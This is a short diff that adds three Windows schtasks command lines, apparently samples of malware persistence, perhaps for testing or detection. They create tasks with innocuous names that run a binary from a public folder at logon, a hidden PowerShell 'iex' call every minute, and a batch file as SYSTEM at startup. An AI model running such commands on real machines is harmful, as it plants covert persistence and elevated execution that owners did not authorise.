@@ -1,0 +1,3 @@
+schtasks.exe /create /tn updater /tr C:\Users\Public\u.exe /sc onlogon
+SCHTASKS /Create /TN "sync" /TR "powershell -w hidden -c iex(...)" /SC minute
+schtasks /create /ru SYSTEM /tn svc /tr c:\temp\a.bat /sc onstart
